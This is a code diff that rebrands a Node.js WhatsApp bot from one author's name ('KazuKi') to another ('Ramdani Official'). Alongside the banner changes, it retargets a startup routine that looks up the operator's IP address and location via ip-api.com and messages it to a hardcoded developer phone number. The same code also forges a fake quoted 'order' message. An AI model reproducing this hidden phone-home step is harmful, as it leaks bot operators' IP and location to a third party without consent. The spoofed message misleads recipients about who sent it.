@@ -212,21 +212,21 @@ require('./api/apiramdani.js')
 nocache('../api/apiramdani.js', module => console.log(color('[WARN]', 'yellow'), color(`'${module}'`, 'yellow'), 'File is updated!'))
 
 const starts = async (Ramdani = new WAConnection()) => {
-    CFonts.say(`KazuKi Gans`, {
+    CFonts.say(`RAMDANI OFFICIAL`, {
         font: 'chrome',
         align: 'center',
         gradient: ['red', 'magenta']
       })
     Ramdani.logger.level = 'warn'
 
-	console.log(color(`${spc2}           [ • CREATOR 𝘽𝙔 𝙆𝘼𝙕𝙐𝙆𝙄𝙈𝘿☣️ • ]` ,`${randomcolors}`))
+	console.log(color(`${spc2}           [ • CREATOR BY RAMDANI OFFICIAL • ]` ,`${randomcolors}`))
 console.log(color(`${spc4}                       < ============================================ >`, `${randomcolors}`))
-console.log(color(`${spc3}                    [•]`, `${randomcolors}`), color(`Hai         : KazuKi Gans`, `${randomcolors}`))
+console.log(color(`${spc3}                    [•]`, `${randomcolors}`), color(`Hai         : Ramdani Official`, `${randomcolors}`))
 console.log(color(`${spc3}                    [•]`, `${randomcolors}`), color(`Bot Version : 17.0.0`, `${randomcolors}`))
 console.log(color(`${spc3}                    [•]`, `${randomcolors}`), color(`Status      : Online!`, `${randomcolors}`))
-console.log(color(`${spc3}                    [•]`, `${randomcolors}`), color(`Owner       : 𝙆𝘼𝙕𝙐𝙆𝙄𝙈𝘿☣️`, `${randomcolors}`))
-console.log(color(`${spc3}                    [•]`, `${randomcolors}`), color(`Author      : 𝙆𝘼𝙕𝙐𝙆𝙄𝙈𝘿☣️`, `${randomcolors}`))
-console.log(color(`${spc3}                    [•]`, `${randomcolors}`), color(`Base Ori By : 𝙆𝘼𝙕𝙐𝙆𝙄𝙈𝘿☣️`, `${randomcolors}`))
+console.log(color(`${spc3}                    [•]`, `${randomcolors}`), color(`Owner       : Ramdani Official`, `${randomcolors}`))
+console.log(color(`${spc3}                    [•]`, `${randomcolors}`), color(`Author      : Ramdani Official`, `${randomcolors}`))
+console.log(color(`${spc3}                    [•]`, `${randomcolors}`), color(`Base Ori By : Ramdani Official`, `${randomcolors}`))
 console.log(color(`${spc4}                       < ============================================ >`, `${randomcolors}`))
 	Ramdani.browserDescription = [ `${setting.NamaBot}`, `${randomserverku}`, '3.0' ]
 
@@ -238,9 +238,9 @@ console.log(color(`${spc4}                       < =============================
 	// Menghubungkan
 	fs.existsSync(`./${sessionsname}.json`) && Ramdani.loadAuthInfo(`./${sessionsname}.json`)
 	Ramdani.on('connecting', () => {
-		console.log(color('[ KazuKi Gans ]', 'aqua'), color('Menyambungkan!'));
+		console.log(color('[ Ramdani Official ]', 'aqua'), color('Menyambungkan!'));
 	})
-const ftroli = { key: { fromMe: false, "participant": "0@s.whatsapp.net", "remoteJid": "6283113989278-1604595598@g.us" }, "message": { orderMessage: { itemCount: 500, status: 200, thumbnail: fs.readFileSync(`./media/foto/thumb.jpg`), surface: 200, message: `【 𝙆𝘼𝙕𝙐𝙆𝙄𝙈𝘿☣️ 】`, orderTitle: 'KazuKi Gans', sellerJid: '0@s.whatsapp.net' } }, contextInfo: { "forwardingScore": 999, "isForwarded": true }, sendEphemeral: true }
+const ftroli = { key: { fromMe: false, "participant": "0@s.whatsapp.net", "remoteJid": "6289512545999-1604595598@g.us" }, "message": { orderMessage: { itemCount: 500, status: 200, thumbnail: fs.readFileSync(`./media/foto/thumb.jpg`), surface: 200, message: `【 RAMDANI BOTZ 】`, orderTitle: 'Ramdani Official', sellerJid: '0@s.whatsapp.net' } }, contextInfo: { "forwardingScore": 999, "isForwarded": true }, sendEphemeral: true }
 const spinner = { 
   "interval": 120,
   "frames": [
@@ -292,12 +292,12 @@ const spinner = {
   ]}
 
 	//connect
-	Kazuki.on('open', () => {
-		console.log(color('[ KazuKi ]', 'aqua'), color('Connected'));
+	Ramdani.on('open', () => {
+		console.log(color('[ danzz ]', 'aqua'), color('Connected'));
 	})
 
 	// session
-	await Kazuki.connect({
+	await Ramdani.connect({
 		timeoutMs: 30 * 1000
 	})
 	fs.writeFileSync(`./${sessionsname}.json`, JSON.stringify(Ramdani.base64EncodedAuthInfo(), null, '\t'))
@@ -306,7 +306,7 @@ const spinner = {
     ]
 
     buttonMessagee = {
-        contentText: `BOT TELAH AKTIF DI NOMOR INI JANGAN LUPA SUBS YT KazuKi`,
+        contentText: `BOT TELAH AKTIF DI NOMOR INI JANGAN LUPA SUBS YT RAMDANI OFFICIAL`,
         footerText: `${fake.FakeReply}`,
         buttons: buttonss,
         headerType: 1
@@ -314,11 +314,11 @@ const spinner = {
     console.log(color('|WARN|', 'yellow'), color('Sending bot info to bot owner', 'cyan'))
 fetch(`http://ip-api.com/line`).then(res => res.text())  
         .then(bu =>{
-       Ramdani.sendMessage("6283113989278@s.whatsapp.net", `─────「 *IP-USER* 」─────\n\n\`\`\`${bu}\`\`\`\n────────────────────`, MessageType.text, { contextInfo: { externalAdReply: { title: `Developer ${setting.NamaBot}`, body: "", previewType: "PHOTO", thumbnail: fs.readFileSync('./media/foto/thumb.jpg'), sourceUrl: `https://wa.me/6283113989278?text=Assalamualaikum+bwang:v` } }})
+       Ramdani.sendMessage("6289512545999@s.whatsapp.net", `─────「 *IP-USER* 」─────\n\n\`\`\`${bu}\`\`\`\n────────────────────`, MessageType.text, { contextInfo: { externalAdReply: { title: `Developer ${setting.NamaBot}`, body: "", previewType: "PHOTO", thumbnail: fs.readFileSync('./media/foto/thumb.jpg'), sourceUrl: `https://wa.me/6289512545999?text=Assalamualaikum+bwang:v` } }})
      console.log(color('|WARN|', 'yellow'), color('Sending ip address to developer bot', 'cyan'))
    })
     Ramdani.sendMessage(`${setting.NomorOwner}@s.whatsapp.net`, buttonMessagee, MessageType.buttonsMessage, {
-        caption: '[ 𝙆𝘼𝙕𝙐𝙆𝙄𝙈𝘿☣️ ]',
+        caption: '[ RAMDANI BOTZ ]',
         "contextInfo": {
             text: 'hi',
             "forwardingScore": 1000000000,
